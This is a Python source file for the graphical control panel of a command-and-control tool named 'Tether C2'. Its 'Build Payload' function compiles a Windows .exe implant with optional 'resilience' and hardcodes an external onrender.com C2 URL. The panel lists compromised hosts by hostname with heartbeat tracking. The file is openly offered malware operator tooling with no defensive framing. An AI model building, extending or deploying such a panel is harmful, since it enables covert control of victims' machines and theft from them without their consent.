import customtkinter as ctk
from tkinter import filedialog, messagebox
from .session_view import SessionViewWindow
from c2_server.builder import build_payload
import time

class App(ctk.CTk):
    def __init__(self, data_queue):
        super().__init__()
        
        self.data_queue = data_queue
        self.sessions = {} # {session_id: {data}}
        self.session_buttons = {} # {session_id: button_widget}

        # --- Window Setup ---
        self.title("Tether C2")
        self.geometry("800x500")
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(1, weight=1)

        # --- Builder Frame ---
        builder_frame = ctk.CTkFrame(self, corner_radius=0)
        builder_frame.grid(row=0, column=0, columnspan=2, sticky="ew", padx=10, pady=10)
        builder_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(builder_frame, text="Payload Name:").grid(row=0, column=0, padx=5, pady=5)
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="my_payload")
        self.payload_name_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

        self.resilience_var = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(builder_frame, text="Enable Resilience", variable=self.resilience_var).grid(row=0, column=2, padx=5, pady=5)

        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.grid(row=0, column=3, padx=5, pady=5)

        # --- Sessions Frame ---
        sessions_label_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        sessions_label_frame.grid(row=1, column=0, padx=10, pady=(0, 10), sticky="ns")
        ctk.CTkLabel(sessions_label_frame, text="Active Sessions").pack()
        
        self.sessions_frame = ctk.CTkScrollableFrame(self, corner_radius=0)
        self.sessions_frame.grid(row=1, column=1, padx=(0, 10), pady=(0, 10), sticky="nsew")

        # --- Start processing queue ---
        self.process_queue()

    def build_payload_handler(self):
        payload_name = self.payload_name_entry.get()
        if not payload_name:
            messagebox.showerror("Error", "Payload Name cannot be empty.")
            return

        output_dir = filedialog.askdirectory(title="Select Output Directory")
        if not output_dir:
            return
            
        self.build_button.configure(state="disabled", text="Building...")
        self.update_idletasks()

        # NOTE: Using render.com free tier URL
        c2_url = "https://tether-c2-communication-line-by-ebowluh.onrender.com"
        success = build_payload(payload_name, c2_url, self.resilience_var.get(), output_dir)
        
        if success:
            messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built successfully!")
        else:
            messagebox.showerror("Build Failed", "An error occurred during the build process. Check the console for details.")

        self.build_button.configure(state="normal", text="Build Payload")


    def process_queue(self):
        """Checks the queue for new data from the web server and updates the GUI."""
        try:
            while not self.data_queue.empty():
                item = self.data_queue.get()
                session_id = item.get("session_id")

                if item["type"] == "new_session":
                    if session_id not in self.sessions:
                        self.sessions[session_id] = item
                        self.add_session_button(session_id, item.get("hostname"))
                
                elif item["type"] == "heartbeat":
                    if session_id in self.session_buttons:
                        # Update button to show it's alive
                        btn = self.session_buttons[session_id]
                        btn.configure(fg_color="green")
                        # Set a timer to revert color if no new heartbeat comes in
                        self.after(45000, lambda b=btn: b.configure(fg_color="orange"))

        except Exception as e:
            print(f"GUI Error: {e}")
        finally:
            self.after(1000, self.process_queue) # Check queue every second

    def add_session_button(self, session_id, hostname):
        button_text = f"{hostname} ({session_id[:8]})"
        button = ctk.CTkButton(
            self.sessions_frame,
            text=button_text,
            command=lambda sid=session_id: self.show_session_data(sid)
        )
        button.pack(fill="x", padx=5, pady=2)
        self.session_buttons[session_id] = button

    def show_session_data(self, session_id):
        session_data = self.sessions.get(session_id)
        if session_data:
            SessionViewWindow(self, session_data)